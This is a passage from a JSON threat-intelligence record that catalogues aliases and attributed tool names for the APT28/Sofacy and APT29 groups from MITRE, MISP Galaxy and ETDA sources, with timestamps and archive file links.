            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "20d3a08a-3b97-4b2f-90b8-92a89089a57a",
            "created_at": "2022-10-25T15:50:23.548494Z",
            "updated_at": "2025-03-27T02:00:55.49688Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "APT29",
                "IRON RITUAL",
                "IRON HEMLOCK",
                "NobleBaron",
                "Dark Halo",
                "NOBELIUM",
                "UNC2452",
                "YTTRIUM",
                "The Dukes",
                "Cozy Bear",
                "CozyDuke",
                "SolarStorm",
                "Blue Kitsune",
                "UNC3524",
                "Midnight Blizzard"
            ],
            "source_name": "MITRE:APT29",
            "tools": [
                "PinchDuke",
                "ROADTools",
                "WellMail",
                "CozyCar",
                "Mimikatz",
                "Tasklist",
                "OnionDuke",
                "FatDuke",
                "POSHSPY",
                "EnvyScout",
                "SoreFang",
                "GeminiDuke",
                "GoldMax",
                "FoggyWeb",
                "SDelete",
                "PolyglotDuke",
                "AADInternals",
                "MiniDuke",
                "SeaDuke",
                "Sibot",
                "RegDuke",
                "CloudDuke",
                "GoldFinder",
                "AdFind",
                "PsExec",
                "NativeZone",
                "Systeminfo",
                "ipconfig",
                "Impacket",
                "Cobalt Strike",
                "PowerDuke",
                "QUIETEXIT",
                "HAMMERTOSS",
                "BoomBox",
                "CosmicDuke",
                "WellMess",
                "VaporRage",
                "LiteDuke"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "46b3c0fc-fa0c-4d63-a38a-b33a524561fb",
            "created_at": "2023-01-06T13:46:38.393409Z",
            "updated_at": "2025-03-27T02:00:02.822155Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "The Dukes",
                "Minidionis",
                "Grizzly Steppe",
                "G0016",
                "Blue Kitsune",
                "BlueBravo",
                "SeaDuke",
                "Cloaked Ursa",
                "YTTRIUM",
                "ATK7",
                "Nobelium",
                "UAC-0029",
                "Group 100",
                "COZY BEAR",
                "IRON HEMLOCK",
                "TA421",
                "ITG11"
            ],
            "source_name": "MISPGALAXY:APT29",
            "tools": [
                "QUARTERRIG",
                "SNOWYAMBER",
                "HALFRIG"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f27790ff-4ee0-40a5-9c84-2b523a9d3270",
            "created_at": "2022-10-25T16:07:23.341684Z",
            "updated_at": "2025-03-27T02:02:09.74554Z",
            "deleted_at": null,
            "main_name": "APT 29",
            "aliases": [
                "APT 29",
                "ATK 7",
                "Blue Dev 5",
                "BlueBravo",
                "Cloaked Ursa",
                "CloudLook",
                "Cozy Bear",
                "Dark Halo",
                "Earth Koshchei",
                "Grizzly Steppe",
                "Group 100",
                "ITG11",
                "Iron Hemlock",
                "Iron Ritual",
                "Midnight Blizzard",
                "Minidionis",
                "Nobelium",
                "NobleBaron",
                "Operation Ghost",
                "Operation Office monkeys",
                "Operation StellarParticle",
                "SilverFish",
                "Solar Phoenix",
                "SolarStorm",
                "StellarParticle",
                "TEMP.Monkeys",
                "The Dukes",
                "UNC2452",
                "UNC3524",
                "Yttrium"
            ],
            "source_name": "ETDA:APT 29",
            "tools": [
                "7-Zip",
                "ATI-Agent",
                "AdFind",
                "Agentemis",
                "AtNow",
                "BEATDROP",
                "BotgenStudios",
                "CEELOADER",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobalt Strike",
                "CobaltStrike",
                "CosmicDuke",
                "Cozer",
                "CozyBear",
                "CozyCar",
                "CozyDuke",
                "Danfuan",
                "EnvyScout",
                "EuroAPT",
                "FatDuke",
                "FoggyWeb",
                "GeminiDuke",
                "Geppei",
                "GoldFinder",
                "GoldMax",
                "GraphDrop",
                "GraphicalNeutrino",
                "GraphicalProton",
                "HAMMERTOSS",
                "HammerDuke",
                "LOLBAS",
                "LOLBins",
                "LiteDuke",
                "Living off the Land",
                "MagicWeb",
                "Mimikatz",
                "MiniDionis",
                "MiniDuke",
                "NemesisGemina",
                "NetDuke",
                "OnionDuke",
                "POSHSPY",
                "PinchDuke",
                "PolyglotDuke",
                "PowerDuke",
                "QUIETEXIT",
                "ROOTSAW",
                "RegDuke",
                "Rubeus",
                "SNOWYAMBER",
                "SPICYBEAT",
                "SUNSHUTTLE",
                "SeaDaddy",
                "SeaDask",
                "SeaDesk",
                "SeaDuke",
                "Sharp-SMBExec",
                "SharpView",
                "Sibot",
                "Solorigate",
                "SoreFang",
                "TinyBaron",
                "WINELOADER",
                "WellMail",
                "WellMess",
                "cobeacon",
                "elf.wellmess",
                "reGeorg",
                "tDiscoverer"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1703124257,
    "ts_updated_at": 1743041831,
    "ts_creation_date": 1702477056,
    "ts_modification_date": 1702477065,
    "files": {
        "pdf": "https://archive.orkl.eu/443181071d70821ccd4f78533f8b6b9947dc4b46.pdf",
        "text": "https://archive.orkl.eu/443181071d70821ccd4f78533f8b6b9947dc4b46.txt",
        "img": "https://archive.orkl.eu/443181071d70821ccd4f78533f8b6b9947dc4b46.jpg"
    }
}